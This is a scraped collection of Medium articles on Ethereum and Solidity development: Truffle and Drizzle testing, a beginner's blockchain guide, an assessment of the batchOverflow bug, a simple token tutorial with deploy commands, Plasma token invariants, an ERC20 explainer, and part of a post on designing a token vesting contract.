transfer of 50 tokens from \u201cAccount 1\" to \u201cAccount 2\u201d. Go to Metamask and copy the second account\u2019s address:Now past it into the form field:When we click \u201cTransfer\u201d, Metamask will open a modal to ask for confirmation:Even if no ethers are being sent, Metamask will always ask for confirmation because transactions are not free. After the network accepts our transaction, the user\u2019s balance should update:If we switch to \u201cAccount 2\u201d on Metamask, the balance should update too:Using the txHash that was returned, we can view our transaction in realtime on any blockchain explorer:https://rinkeby.etherscan.io/tx/0x2c081e0a67545b0e92a7e19eb156a446a5431aa3c2440a029556994dde49944dManual testing of the UI can be quite tedious. To help us automate testing of React components, create-react-app integrates with the Jest testing framework. In fact, Drizzle goes one step further, integrating with Redux to give us a store that syncs with our contract data.React component => Drizzle store => contract stateMoreover, Drizzle automatically generates forms for all our contract functions, which we can easily map to the appropriate reducers.form submit => Drizzle reducer => contract functionSince the reducers are mostly asynchronous web3 calls, Drizzle also integrates with redux-saga to make asynchronous testing a breeze!ConclusionWhat makes Ethereum special is its emphasis on the smart contract layer, which Truffle also emphasizes, providing a convenient framework and a higher-order abstract contract that decorates any Solidity contracts with the functionalities to compile, test, upgrade, and deploy, seamlessly. This article is a deep dive into those features with the hope of imparting a clearer understanding and a better intuition.For a real live example of how Truffle is used in one of our open source projects, check out:How to Decentralize the Film IndustryA Crowdfunding dApp to Empower Indie Filmmakers! \ud83d\udcaamedium.comIn this article, we open up the entire source code of our dApp to explain our entire thought process, from architecture to a fully functional UI across our entire development stack!We like to think of HeartBank\u00ae as the nonprofit twin of ConsenSys \ud83d\ude07Reference: https://truffleframework.com/docs/truffle/quickstart", "responses": 5, "tags": ["Ethereum", "Blockchain", "Solidity", "Truffle", "Dapps"]}, {"title": "How to start learning Blockchain ?", "post_link": "https://medium.com/@vishwasanand.cse/how-to-start-learning-blockchain-3e94d7c81688?source=search_post", "author_name": "Vishwas B Anand", "author_link": "https://medium.com/@vishwasanand.cse", "publish_date": "2017-11-25", "last_modified_date": "2018-06-21", "readtime": "5.04", "claps": 793, "voters": 99, "content": "How to start learning Blockchain ?Vishwas B AnandFollowNov 25, 2017 \u00b7 6 min read\u2014 A quick guide for beginnersWe all are very new to Blockchain technology and we all want to learn it, right? But the problem is, today we don\u2019t find enough resources on Internet to learn it in a proper way. Yes there are few articles, tutorials, videos etc but there is not any proper step by step guide to learn concepts of Blockchain and development in Blockchain.I started learning it since few months back and this is the major problem that I met. One of the major challenge is, how to start and where to start? People keep are asking this question, hence I thought I should help them (May not be the best way but at least I am trying to do so :)). So what I am going to do here is, collect resources (like links,videos,tutorials etc.) and put them all together in proper documented way so that you need not to spend time looking for them on web. Having said that, I am going to divide the tutorial into two sections :SECTION A : Understanding Blockchain TechnologySECTION B : Development in Blockchian.SECTION A :Understand Blockchian technology, a very basic, before going into development directly.Blockchain and BitCoin are two different thing.Try to look into Blockchain use cases, where it is implemented (dont go for \u2018How\u2019) and where it can be implemented?SECTION B :What is DAAPs?What is Ethereum \u2014 basic?What is Smart Contracts and how to write contracts on Ethereum BC using Solidity language?Smart Contracts development on Ehtereum BC. a) On Remix b) On Private Blockchain .Calling smart contracts methods/APIs from client application (mobile or web) using Web3.js.Lets say you have no idea what Blockchain is or you have just heard about it some where and you are very eager to learn about it. Then you are at the right place.So lets start with SECTION A : Understanding Blockchain Technology.Understand Blockchian technology, a very basic ideaBlockchain and BitCoin are differentI will take these two topics at once.You will find definition of Blockchain on internet very easily, so I will not go into that, instead I highly recommend you to watch the video first. The video clearly explain basic of Blockchain, thanks to Mr. Shai Rubin for creating such an awesome video.What is Blockchain in nutshellNow, that you got the idea of Blockchain (Assuming that you\u2019ve watched the video), you should be able to answer these questions, and if you are not then watch it again :a) One transaction happens and will get recorded into the ledger,but how will that transactions be validated and who will do that ?b) lets say you\u2019ve $1 and you sent it to someone and before it is getting validated and added to the ledger by miner, you did another transaction with that $1 (i.e. Double spending problem), then what will happen?c) Miners do validation of transaction \u2014 but what is validation and what does it means?Here is one good article on double spending problem.What is Double Spending & How Does Bitcoin Handle It?Bitcoin is gaining rapid popularity and adoption across the globe. It is re-defining the way we use money by being the\u2026coinsutra.comSo now once you got the idea about Blockchain, don\u2019t you want to see it in action? Here is one video created by Mr. Anders, which is a visual introduction to the concepts behind a Blockchain.Visual demo of BlockchainI think as of now both the above topics are clear. But if you want to learn more about Bitcoin under the hood, just read the white paper published by the creator of Bitcoin Mr. Satoshi Nakamomto.Try to look into Blockchain use cases, where it is implemented (don\u2019t go for \u2018How\u2019) and where it can be implemented.Almost every where. Blockchain was intervene technology for Bitcoin transaction, so until Ethereum came, people use this term in finance sector only. But Ethereum has given it wings to spread into other public as well as private sector. Blockchain is being used every where now, starting from education, finance, real state, voting, record keeping to even supply chain, I mean almost every where. Here is one very good article on this topic.Now that you what basic idea of Blockchain, lets understand how to use Blockchain into our business. We can create DAAP \u2014 Decentralize applications.Lets see how in SECTION B : Development in Blockchain.What is DAAP?Daap has its backend code running on a decentralized peer-to-peer network. Contrast this with an app where the back end code is running on centralized servers. Daap are just like any other web or mobile application with one difference, it has Blockchain running in its back end. Don\u2019t worry if you did not understand, we will discuss about it again and we will show you a sample Daap :)What is Ethereum \u2014 basic?Ethereum is the platform based on Blockchain technology that enables developers to build and deploy decentralized applications. Before Ehtereum, Blockchain was being used only for Bitcoin or other Crypto currencies. But Vitalik Buterin thought that it can also be used in other sectors. And development is possible on Blockchain as well. So he created another Blockchain which let developer code logic into the Blockchain.Again you will find many other resources, related to this topic. Here is one of them Ethereum White Paper .What is Smart Contracts and how to write contracts on Ethereum BC using Solidity language?As of now we understood, what applications can be built on Blockchain (i.e. Daaps)? And what platform can be used to build these application (i.e. Ethereum BC)? But how can we write logic into Ethereum Blockchain?The answer is using Smart contracts. SC is basically a piece of code that runs on Blockchain. These contracts are written in different languages like, Go, Solidity or Java. Most popular one is Solidity (a java script like language).Here is one good tutorial on Smart Contract. It\u2019s a series of tutorial, please go through it to understand SC and its development basics.Being a web services developer, I see these smart contracts like web service only, where you can write setter \u2014 getter methods just like APIs that you expose in your web service.And here is the documentation of Solidity. Read online or download the pdf, whatever you want.Smart Contracts development on Ehtereum BC. a) On Remix b) On Private BlockchainSo, we understood Daap, we understood the platform Ethereum, we understood what Smart Contract is and how to write it, now the question comes into our mind is How to deploy this contract?Again there are many ways, Since I don\u2019t want to make it complicated, let us take a look on two of them.a) On Remix : Browser based IDE, write, deploy and see the output very quickly. If you saw the above video, you got the idea. Remix Browser IDEb) Create your own private Ethereum BC using Geth. Here are few articles on that : Article 1 Article 2 both articles are equally good.Calling smart contracts methods/APIs from client application (mobile or web) using Web3.js.You understood Dapp, you understood Ethereum, you understood Smart Contract and Solidity, you also understood the SC development. So, your Blockchain part is ready. Now you want to connect your web application or mobile application with your Blockchain \u2014 you want to interact with smart contract. How would you do that?Answer is using Web3. Its a library (can be found on npm)that you will install into your application and interact with your smart contract code.Congrats you have now basic idea of Blockchain and its development ! Welcome to the crypto world :)As promised, here one sample Daap that I built on Ethereum Blockchain.Vishwas1/voting-daap-2017Contribute to voting-daap-2017 development by creating an account on GitHub.github.comRead it, Fork it what ever you like. Happy Coding!", "responses": 5, "tags": ["Blockchain", "Ethereum", "Solidity", "Cryptocurrency", "Smart Contracts"]}, {"title": "Quantstamp\u2019s assessment of the recent batchOverflow and proxyOverflow vulnerabilities", "post_link": "https://medium.com/@Jon_A_Haas/quantstamps-assessment-of-the-recent-batchoverflow-and-proxyoverflow-vulnerabilities-1f9562fa7340?source=search_post", "author_name": "Jonathan Haas", "author_link": "https://medium.com/@Jon_A_Haas", "publish_date": "2018-04-26", "last_modified_date": "2018-06-14", "readtime": "1.36", "claps": 1427, "voters": 96, "content": "Quantstamp\u2019s assessment of the recent batchOverflow and proxyOverflow vulnerabilitiesJonathan HaasFollowApr 26, 2018 \u00b7 2 min readThe vulnerable batchTransfer functionbatchOverflow and proxyOverflow present an unfortunate but critical message: smart contract auditing is vital. The bugs themselves are fairly simple and are able to be executed readily. These bugs work by performing an attack known as \u201cinteger overflow.\u201d Integer overflow occurs when trying to place an integer (a whole number) into a space in memory that is too large for the integer data type.In application, what this means is that by flooding the system with a number too large for use an attacker could create an additional supply of tokens that do not exist within the system. For exchanges, this presents an immense attack vector, as token minting can occur without necessary sanity checks that properly assure issuance of the token. In relevant transactions, this will appear to mint tokens out of seemingly nothing.That is how the bugs were initially caught. On April 22nd, PeckShield\u2019s automated system scanning for unusual activity in ERC20 token transfers noted that an anomalously large amount of token had been transferred in BEC (BeautyChain). After the transfer, the PeckShield team analyzed the BeautyChain contract for vulnerabilities \u2014 and found batchOverflow. A brief synopsis is available on Medium concerning batchOverflow and proxyOverflow.Although not every ERC20 token was open to this vulnerability \u2014 and it should be noted that the flaw is not within the ERC20 standard itself \u2014 many contracts were published that never were checked for these potential exploits.To serve our community, Quantstamp has contacted affected tokens and their relevant exchanges to assist at cost. We won\u2019t be making a profit from our effort to make the Ethereum ecosystem more secure.Catching vulnerabilities before contracts go live is a better solution than rapid patches. We would love to help you solve these issues in advance, please contact security@quantstamp.com for more information.", "responses": 0, "tags": ["Ethereum", "Solidity", "Security", "Erc20", "Quantstamp"]}, {"title": "A Gentle Introduction to Ethereum Programming, Part 2", "post_link": "https://medium.com/zeppelin-blog/a-gentle-introduction-to-ethereum-programming-part-2-7bbf15e1a953?source=search_post", "author_name": "Facu Spagnuolo", "author_link": "https://medium.com/@facuspagnuolo", "publish_date": "2017-11-17", "last_modified_date": "2019-02-13", "readtime": "6.72", "claps": 766, "voters": 98, "content": "A Gentle Introduction to Ethereum Programming, Part 2Facu SpagnuoloFollowNov 17, 2017 \u00b7 7 min readThis is the second part of our Ethereum introduction guide. If you haven\u2019t read part 1, I highly recommend it to better understand this post.Enjoy, and please do not hesitate to reach out with questions, corrections or feedback.Index1. Taking the first steps2. Interacting with a contract2.1. Introduction to smart contracts in Ethereum2.2. Your first smart contract2.3. Deploying a smart contract2.4. Web3 and smart contracts3. Frameworks & Tools in the real world4. A real DApp, a token marketplace \u2014 coming soon2. Interacting with a contract2.1. Introduction to smart contracts in EthereumWell, you already know some basics about Ethereum, you\u2019ve been interacting with an Ethereum node, sent some transactions between accounts, etc. But there is something else that makes Ethereum amazing: smart contracts.As I explained in the introduction, a smart contract is a program that runs on the EVM. You can build any smart contract to do whatever you want, but today, most are being used for crowdfounding tools like ICOs or token sales. Allow me to explain these.I will start with crowdfunding, a concept that I\u2019m sure you\u2019re familiar with. Projects do a crowdfunding campaign in order to raise funds to carry out a project. You can issue a digital asset related to your project and immediately sell it to anyone in the world, for almost zero cost. This is what we call an Initial Coin Offering (ICO).To carry out an ICO with smart contracts, you just need to implement the logic that makes your digital assets tradable and valuable. Sounds great, doesn\u2019t it? These are Ethereum tokens. A token is a digital asset within the Ethereum ecosystem.Let\u2019s try to analyze all these ideas through an example.Suppose you have health food company that wants to launch a new brand. You decide to conduct an ICO to raise 20,000 ETH. You offer 10 tokens in return for every 1 ETH you collect, promising that contributors will be able to buy food at your stores with the tokens. To do this, you can develop a token smart contract that stores the proportional amount of tokens for each contributor.Now, let\u2019s suppose you raised that money, developed your project, and opened your first store. Then, you decide to sell each salad for 1 token. After a week, it turns out that you have an increasing demand, but given that the supply of salads is limited, your customers notice and start trading your tokens as an asset, raising their market value.This process has been carried out in real life, given Ethereum allows virtually anyone to create their own tradeable, digital asset.2.2. Your first smart contractLet\u2019s see how you can build a basic Ethereum token. I will use this example to make an introduction to some Solidity basics.Please know that this examples are just for learning purposes, you should not use them in production.pragma solidity ^0.4.0;contract MyToken { address public creator; uint256 public totalSupply; mapping (address => uint256) public balances;function MyToken() public {   creator = msg.sender;   totalSupply = 10000;   balances[creator] = totalSupply;} function balanceOf(address owner) public constant returns(uint256){   return balances[owner]; }  function sendTokens(address receiver, uint256 amount)  public returns(bool){   address owner = msg.sender;      require(amount > 0);   require(balances[owner] >= amount);      balances[owner] -= amount;   balances[receiver] += amount;   return true; }}Let\u2019s go step by step. The pragma keyword tells which version of Solidity you are using for your source code. Then, it begins the contract definition initiating with its name, in this case, MyToken. Next, you will find three variables:creator is an address variable to store the owner of the contract.totalSupply is an 256 bit unsigned int to store the amount of tokens willing to be shared with the investorsbalances is a map from addresses to unsigned ints where the balances of each investor will be storedAfterwards, you will find the constructor function. As you can see, it is a function with the same name of the contract, and it will be called only once every time a new instance of the contract is deployed to the network. Here is where the owner of the contract gets stored. Since every function call is a transaction, it is possible to know the owner of the contract using the sender of the transaction, that is msg.sender. Finally, the contract defines a total supply of 10,000 tokens, and assigns it to the token creator.The next function is an easy one: balanceOf simply tells you the balance of an address received by parameter. Maybe you are wondering what the constant keyword means. Well that\u2019s because Solidity has two kinds of functions, constants and non-constant.Non-constant functions perform state changes. On the other hand, constant functions are read only once, meaning those don\u2019t perform any state changes, they just read data. Actually, there are two types of constant functions:view declared functions promise not to modify the state (alias to constant)pure declared functions promise not to read from or modify the stateThe last function is the one that allows us to trade tokens between addresses. This is a non-constant or transactional function because you will be changing balances. It expects the receiver\u2019s address and the amount of tokens you want to transfer by parameter, and it returns a boolean representing whether the transaction has been successfully executed or not. You can skip the first line, it is just keeping the sender of the function in the owner variable.Next, you will find two preconditions:...require(amount > 0);require(balances[owner] >= amount);...require is one of the methods that you can use to check conditions or make validations. It will eval a condition and revert in case that condition is not met. So, in this case, it is requiring that the amount of tokens to be transferred is greater than zero, and ensuring the sender has enough balance to send that amount.Finally you are subtracting the required amount of tokens from the owner\u2019s balance and adding it to the receiver\u2019s balance:... balances[owner] -= amount; balances[receiver] += amount; return true;}2.3. Deploying a smart contractNow, let\u2019s start playing with our contract! You will need to deploy our contract to the network first. To do that, you will use a Solidity compiler for node.js called solc. You can install it by running:npm install -g solcCreate a file called MyToken.sol, and paste the contract code into it. Then, open a terminal console in the same dir where you placed that file. First, compile it running the following command:solcjs MyToken.sol --binThe compiler will create a MyToken_sol_MyToken.bin file with the output. You can check that file contains just bytecode. Next, you will need to use solc to build the ABI (Application Binary Interface), an interface or template of your contract that tells you the available methods of it. This is the point of contact with Web3. Your just need to run:solcjs MyToken.sol --abiThen, you will see a new file called MyToken_sol_MyToken.abi with a JSON content that bassically defines the interface of your contract.Finally you just need to deploy your contract from a node.js console using testrpc running in background. Once you have done that, let\u2019s initialize web3://instance web3Web3 = require('web3')provider = new Web3.providers.HttpProvider(\"http://localhost:8545\")web3 = new Web3(provider)Web3 gives you the possibility to parse your contract ABI and provide a JavaScript API to interact with it. Then, you just need the bytecode to deploy a new instance of that contract to testrpc. Please follow the next commands:// load filesmyTokenABIFile = fs.readFileSync('MyToken_sol_MyToken.abi')myTokenABI  = JSON.parse(myTokenABIFile.toString())myTokenBINFile = fs.readFileSync('MyToken_sol_MyToken.bin')myTokenByteCode = myTokenBINFile.toString()//deployaccount = web3.eth.accounts[0]MyTokenContract = web3.eth.contract(myTokenABI)contractData = { data: myTokenByteCode, from: account, gas: 999999 }deployedContract = MyTokenContract.new(contractData)Finally, you can check the address of your new deployed contract by calling deployedContract.address. Please save that address because you will need it to interact with your contract \ud83d\ude032.4. Web3 and smart contractsLet\u2019s begin by searching the token balances of your testrpc accounts. To do so, you will need to access the instance of your deployed contract first:contractAddress = deployedContract.addressinstance = MyTokenContract.at(contractAddress)web3.eth.accounts.forEach(address => { tokens = instance.balanceOf.call(address) console.log(address + \": \" + tokens)})You will notice that your first account is the one that owns the total supply, which is expected. Great! Next, let\u2019s transfer some of those tokens to another account:// send tokensamount = 10from = web3.eth.accounts[0]to = web3.eth.accounts[1]transactionHash = instance.sendTokens(to, amount, { from: from })// checkout balances againweb3.eth.accounts.forEach(address => { tokens = instance.balanceOf.call(address) console.log(address + \": \" + tokens)})You should see that now the second address has 10 tokens! And you can also search for the transaction information as you did in the first part of this guide:web3.eth.getTransaction(transactionHash)I also built a simple UI for this mini DApp, you can find it here. You will see a MyToken.json file that holds the ABI of our contract. I just pasted the content of the ABI generated by the solidity compiler into it. You will also find an app.js file similar to the previous app, but including the logic that I just showed you to send tokens and detailed token balances of your accounts.UI of the DApp that I built to test MyToken transfersYou can download this app too and start playing with it. You will be asked for the address of the contract instance that you deployed.Thank you for reading this post, please remember that any questions, feedback, or suggestions are welcome! If you liked it, stay tuned for the third part of this guide, focused on Ethereum framework and tools.Note: The token described in this article is not ERC20 compliant to reduce the new term overload. If you don\u2019t know what an ERC20 compliant token is, we\u2019ll explain it in the next article.Be part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 9, "tags": ["Ethereum", "Guide", "Programming", "Smart Contracts", "Solidity"]}, {"title": "Token Contracts on Plasma or: a Tale about Local and Global Invariants", "post_link": "https://medium.com/@chriseth/token-contracts-on-plasma-or-a-tale-about-local-and-global-invariants-e37fadba150?source=search_post", "author_name": "Christian", "author_link": "https://medium.com/@chriseth", "publish_date": "2017-09-18", "last_modified_date": "2018-05-28", "readtime": "4.22", "claps": 477, "voters": 95, "content": "Token Contracts on Plasma or: a Tale about Local and Global InvariantsChristianFollowSep 18, 2017 \u00b7 5 min readCC-BY-SA 3.0 by Manfred Werner \u2014 TsuiThe plasma system defines a structure of interconnected blockchains arranged in a tree structure that promises scalable smart contracts. One of the key ideas there is that each of the blockchains regularly store their current block hash in their parent chain so that users can challenge potentially invalid child state transitions in the parent chain.This model is secure not because of a difficult proof of work (the chains would use proof of stake or even a fixed validator set), but rather because users watch chains they have a stake in and thus will challenge invalid state transitions, potentially escalating as far up as the trusted main chain.Here, the scalability does not come from the fact that blockchains are relieved from their load by creating a big number of smaller chains and moving the transactions there. Scalability is only achieved once a user does not have to verify every single transaction that is sent to the system.If, for example, a user only cares about a single smart contract that resides in a single chain in a leaf of the system, it is sufficient for the user to verify this leaf and all nodes on the path to the root chain. If a transaction is committed by means of block hashes all the way up to the root chain and there is no invalid state transition in the chains on the way up to the root, the user can be reasonably sure that the transaction cannot be retroactively declared invalid.This system still does not solve the scalability problem: As long as the smart contract only lives inside a single blockchain, it can merely process a limited amount of transactions. While this might be enough for some use-cases, a token contract can easily reach this limit. The system would scale, if the token contract exists on all of the blockchains, dividing the token transfer load and it is possible to move tokens up and down the tree. Users would have accounts in only one or perhaps some of the chains and watch the paths to the root from chose chains.In such a simple model, an attacker could select a chain that is mostly unused, take it over, create an invalid state transition that creates tokens out of thin air and then move these tokens up to the root. If nobody is watching the attacked chain (or the attacker can turn off their computers or censor their transactions), the attacker is safe as soon as he or she is able to move the tokens far enough up.Creating tokens out of thin air is a violation of the assumed invariants of a token contract. Unfortunately, in contrast to the other invariant \u201cnobody but me can spend my tokens\u201d, this is a global invariant and thus cannot be enforced by just watching a small number of chains.Luckily, there is an invariant that is almost the same as \u201cnobody can create tokens out of thin air\u201d, but which can be locally enforced: We track the sum of the token balances of each direct child chain in the smart contract of the parent chain and enforce that changes to these numbers always have to come with a respective amount of tokens being moved from the child to the parent or vice-versa. This way, a child chain basically becomes a single account in the parent chain which is only subdivided into the respective token holders in the child chain.In this situation, an attacker can still create tokens in unwatched child chains, but he or she can only move as many tokens out of these flawed chains as is the total balance of these chains. For users that are not interested in these chains, the situation would not change: For them, someone took out tokens from a pool, but it is not relevant who did it.In effect, the attacker of course steals tokens from users who have accounts in the attacked child chains, but at least the impact of the attack is confined to chains that are not properly watched. In turn, this means that you have to constantly watch all chains you have tokens in. But there is also a \u201ccheaper\u201d solution to this:If you do not want to move your tokens very often, you can transfer them to a chain close to the root chain. These chains likely have higher transaction fees (which is not relevant if you just want to park your tokens), but also provide higher security because they are watched by more people.Example Token ContractThe following smart contract is replicated on all chains in the system. The smart contract language used follows the syntax and semantic of Solidity, but it has one additional feature: Functions can be marked \u201cedge\u201d.Such functions are executed as part of a transaction sent to an edge of the tree, i.e. sent to two chains at the same time that are linked with an edge in the tree. Parts of the code of these functions are executed on the relative parent and other parts on the relative child in sequence. The actual compiled smart contract will use logs and Merkle proofs for synchronisation between these parts.Inside an edge functions, the identifier child is an integer (0 or 1 for two children) identifying the child relative to the parent.In the event where a child chain is declared faulty, the child parts can also be executed in the parent chain or recursively in any chain on the way up to the root (updating the root hash of the child chain stored in the parent chain and requiring relevant Merkle proofs for execution). A child that does not react to edge transactions after a certain time is declared faulty.Because of the synchronisation points between the \u201cchild\u201d and \u201cparent\u201d parts, the tokens can be safely moved up and down the tree.ConclusionCurrently, you have to put a little more thought into your smart contracts if you want them to be scalable on a plasma-like system. Not every problem is suitable for map-reduce or can be processed using big data algorithms either. If you can come up with elementary promises your smart contract should fulfill and can transform them into local properties, though, you can achieve almost infinite scalablity!", "responses": 3, "tags": ["Blockchain", "Plasma", "Scalability", "Smart Contracts", "Solidity"]}, {"title": "The Anatomy of ERC20", "post_link": "https://medium.com/blockchannel/the-anatomy-of-erc20-c9e5c5ff1d02?source=search_post", "author_name": "Steven McKie", "author_link": "https://medium.com/@McKie", "publish_date": "2017-09-30", "last_modified_date": "2018-06-15", "readtime": "3.56", "claps": 636, "voters": 90, "content": "The Anatomy of ERC20What\u2019s on the Inside of Ethereum\u2019s Most Popular ContractSteven McKieFollowSep 30, 2017 \u00b7 4 min readCrosspost: This was originally posted by Gerald Nash \u26a1\ufe0f, here. It was reposted to BlockChannel with their permission.In light of today\u2019s ICO launches, digital token sales during which companies and organizations raise millions of dollars instantly while giving out digital assets, it\u2019s important to recognize the underlying technology that nearly all of these tokens possess: ERC20.Ethereum Request for Comments 20, or ERC20, is an Ethereum Improvement Proposal introduced by Fabian Vogelsteller in late 2015. It\u2019s a standard by which many popular Ethereum smart contracts abide. It effectively allows smart contracts to act very similarly to a conventional cryptocurrency like Bitcoin, or Ethereum itself. In saying this, a token hosted on the Ethereum blockchain can be sent, received, checked of its total supply, and checked for the amount that is available on an individual address. This is analogous to sending and receiving Ether or Bitcoin from a wallet, knowing the total amount of coins in circulation, and knowing a particular wallet\u2019s balance of a coin. A smart contract that follows this standard is called an ERC20 token.ERC: Token standard \u00b7 Issue #20 \u00b7 ethereum/EIPsERC: 20 Title: Token standard Status: Draft Type: Informational Created: 19\u201311.2015 Resolution: https://github.com\u2026github.comAll of the previously described functionality is able to exist by defining a set of functions that allow a smart contract to emulate a digital token. But how does that work?ERC20 defines the functions balanceOf , totalSupply , transfer , transferFrom , approve , and allowance . It also has a few optional fields like the token name, symbol, and the number of decimal places with which it will be measured.Note: This is a concise declaration of an example ERC20 contract.An overview and example of each field within the contract is as follows.totalSupply()Although the supply could easily be fixed, as it is with Bitcoin, this function allows an instance of the contract to calculate and return the total amount of the token that exists in circulation.balanceOf()This function allows a smart contract to store and return the balance of the provided address. The function accepts an address as a parameter, so it should be known that the balance of any address is public.approve()When calling this function, the owner of the contract authorizes, or approves, the given address to withdraw instances of the token from the owner\u2019s address.Here, and in later snippets, you may see a variable msg . This is an implicit field provided by external applications such as wallets so that they can better interact with the contract. The Ethereum Virtual Machine (EVM) lets us use this field to store and process data given by the external application.In this example, msg.sender is the address of the contract owner.transfer()This function lets the owner of the contract send a given amount of the token to another address just like a conventional cryptocurrency transaction.transferFrom()This function allows a smart contract to automate the transfer process and send a given amount of the token on behalf of the owner.Seeing this might raise a few eyebrows. One may question why we need both transfer() and transferFrom() functions.Consider transferring money to pay a bill. It\u2019s extremely common to send money manually by taking the time to write a check and mail it to pay the bill off. This is like using transfer() : you\u2019re doing the money transfer process yourself, without the help of another party.In another situation, you could set up automatic bill pay with your bank. This is like using transferFrom() : your bank\u2019s machines send money to pay off the bill on your behalf, automatically. With this function, a contract can send a certain amount of the token to another address on your behalf, without your intervention.Token NameThis is an optional field, but many popular tokens include it so that popular wallets like Mist and MyEtherWallet are able to identify them.contract MyERCToken {  string public constant name = \"My Custom ERC20 Token\";}Token SymbolAnother optional field used to identify a token, this is a three or four letter abbreviation of the token, just like BTC, ETH, AUG, or SJCX.contract MyERCToken {  string public constant symbol = \"MET\";}Number of DecimalsAn optional field used to determine to what decimal place the amount of the token will be calculated. The most common number of decimals to consider is 18.contract MyERCToken {  uint8 public constant decimals = 18;}The total source code of ERC20 token that we just created can be found here.In the end, the original ERC20 proposal is rather unappreciated. It opened up avenues for a new set of smart contracts that could be created and distributed in the same fashion as Bitcoin or Ethereum. This proves to be very enticing for young companies, as the entire ERC20 ecosystem is hosted on the Ethereum blockchain, a large pre-existing network of computers. This means that developers and young companies don\u2019t have to attract miners in order to sustain their tokens, something that can save a lot of money. And, these tokens can be hosted on exchanges to be traded like other assets, so investors can easily buy and sell these tokens like more popular currencies.", "responses": 0, "tags": ["Blockchain", "Ethereum", "Solidity", "Investing"]}, {"title": "The Making of an Open-Source Token Vesting Smart Contract", "post_link": "https://medium.com/@CPUcoin/the-making-of-an-open-source-token-vesting-smart-contract-34274f9ea257?source=search_post", "author_name": "CPUcoin", "author_link": "https://medium.com/@CPUcoin", "publish_date": "2019-03-22", "last_modified_date": "2019-06-03", "readtime": "10.6", "claps": 1041, "voters": 82, "content": "The Making of an Open-Source Token Vesting Smart ContractIntroductionCPUcoinFollowMar 22 \u00b7 11 min readIn this article, I\u2019m going to talk a bit about the development of the CPUcoin token vesting smart contract, a significant piece of work that we painstakingly developed for our upcoming IEO (initial exchange offering). At the end of this article, I\u2019m going to give away our code. Yes, you are free to use, modify and share our work (in keeping with our MIT license).In future articles, I may delve into the code to explain in more detail how it works. But for now, I\u2019m going to discuss what went into its design. So, if you happen to be involved with a project having requirements for a token needing support for grants with flexible vesting schedules, then this information may be of interest to you. Our solution is tailored somewhat to our own needs, however, we made it general purpose enough so that you can easily reuse parts of it for adapting to your needs.Smart Contract PitfallsOur aim is to successfully launch our IEO (initial exchange token offering) to make our ecosystem cryptocurrency tokens available for sale in the marketplace. As you may know, to create a working cryptocurrency token, you must develop a smart contract, the software code that defines all the rules and behavior of your new currency. We are releasing our token on the Ethereum blockchain, and in that environment, the smart contract programming language is known as Solidity.You may also know that once a smart contract is released it is final. Your code cannot be retracted, changed, updated or patched to correct problems if a bug is discovered later or you find you have missed something. Once the code is released, it is stored on the blockchain. And the blockchain is, by design, built so that the past is immutable. No means has been provided to mutate smart contract code. A software bug in a critical portion of your smart contract could easily destroy the value of your token before it gets off the ground. Here are just a few of the scenarios which have actually occurred in real-world live smart contracts, dooming many of them:Unsigned math underflowA software bug causing an unsigned math underflow to occur due to bad inputs. This results in a calculation unexpectedly producing a negative number, which when represented as an unsigned value will always appear incorrectly as a huge positive amount. Once discovered, hackers can exploit this by carefully crafting bad inputs to your contract, letting them create an immense number of tokens for themselves. If the inputs had been checked up front, the hacker would have instead seen a mundane error.Incorrect method visibilityA software bug in an internal, private method performing some critical administrative function that was written with the method having a wrong visibility set. This causes that intended-as-private code to unexpectedly become exposed publicly to everybody. Nothing hides on the blockchain after all, and hackers who study your code will discover the \u201chidden\u201d administrative function and try calling it themselves. Depending on the power of the internal code, the hacker may get the equivalent of root access to your contract, taking over control of it from you. If visibility had been specified as `internal` or `private`, the method code would not be reachable externally.Unknowingly calling malicious codeA software bug occurs that because a routine call is made, such as to transfer funds, without the calling code realizing that the target address of the transfer is actually the address of another smart contract, not a wallet. A hacker who studies your code could craft and deploy a special smart contract whose purpose is to attack yours. The hacker implements an identical `transfer()` method that contains malicious code carefully designed to cause your smart contract into a state it cannot get out of, thereby locking it up. Or worse, it could force your contract to self-destruct, thereby sending all your ETH to the attacker! There are ways to write contract code to be immune from this type of threat.There are a number of well-known ways in which smart contracts can and have failed. There are also well-documented best practices one must follow when writing smart contract code to avoid these pitfalls. It\u2019s perhaps a fledgling startup\u2019s biggest fear that their IEO or ICO gets sabotaged by hackers, with real monetary value slipping away never to be recovered. At best, the sale would have to be halted, a new smart contract is written and the IEO/ICO process restarted. But this would likely still be a damaging outcome, whose full resolution would be very onerous.Know Your RequirementsBesides writing code resistant to attack, you must be sufficiently complete in defining all the features, functionality and behavior that your organization will need to create to serve its operational needs. Your project is a business, after all, and if some internal requirement was overlooked, you could end up with a token that doesn\u2019t support a critical workflow. This could drastically constrain your internal operations, and limit management and administrative control of your token later.It can be difficult to surface all future business needs up front. Often the people who understand the business needs, the people who understand the operational needs and the people who will write the code are different individuals in your organization that come from different, unique perspectives. At best they have only partially overlapping knowledge and experience. It\u2019s difficult for any one stakeholder to know the needs of the other stakeholders, and indeed, each may not know up front what their own needs are.Therefore, it\u2019s critical to begin with a comprehensive planning and design process up front, one which includes all stakeholders and takes the time to surface all needs. Expectations around your company\u2019s token contract development process should be clearly defined, set and agreed to up front. The result of your hard work must be not only bug-free but, but must also be substantially complete, having support for all the features you will need now and later.Our Vesting Token RequirementsIn our design and planning requirements, we came up with the following basic needs for our IEO vesting token:A token contract based on prevailing standards that would be generally compatible with exchangesAn ability for us to offer vesting purchase incentives to buyers of our token, giving us enough flexibility to create a variety of deal scenarios that allow us to entice different types of buyerAn ability to incentivize our dedicated and hardworking employees with vesting token grantsWe quickly realized that we needed to build in general support for vesting schedules. Vesting schedules are not difficult to understand, define and create. The code for this should be straightforward, right? But we kept digging deeper and asked ourselves more questions. The more we thought about the big picture, the more we realized that we\u2019d need additional capabilities. Soon we had a lengthy list of features and needs.Visualization of vesting schedule structureWe discussed and debated the merits of each requirement, forging the list down to a manageable set of only the truly necessary requirements. This work forced us to think deeply about future operational processes that hadn\u2019t yet been discussed, let alone established.Our white paper dictates that we have four pools: 72% for the IEO, 10% for the team, 10% for advisors/partners and 8% for token swaps. How do we enforce these? We\u2019re going to need to be able to operate some form of individually administered token pools which conform to the rules we\u2019ve laid out.Employee grants at first appear to be quite like bonus tokens granted to buyers, just having different vesting terms. Yet there is at least one key difference: employee grants must be revocable if the employee leaves or is terminated, whereas buyer grants are always purchased, are non-refundable and therefore must not only be irrevocable (and there must be no way to accidentally revoke them). We\u2019ll need simultaneous support for these use cases.Considering administration, who will control the smart contract? Is the person who issues employee grants 